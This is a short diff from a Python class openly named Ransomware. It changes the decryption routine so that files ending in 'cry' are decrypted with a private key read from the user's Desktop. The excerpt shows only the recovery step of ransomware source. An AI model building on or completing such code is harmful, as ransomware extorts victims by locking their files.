@@ -82,7 +82,7 @@ class Ransomware:
                         for file in files:
                             if file.endswith("cry"):
                                 file_path = os.path.join(root, file)
-                                dec_file_path = decrypt_file(file_path, "PUT_ON_DESKTOP.pem")
+                                dec_file_path = decrypt_file(file_path, self.sysRoot+"/Desktop/PUT_ON_DESKTOP.pem")
                                 print(dec_file_path)
                     break
             except Exception as e:
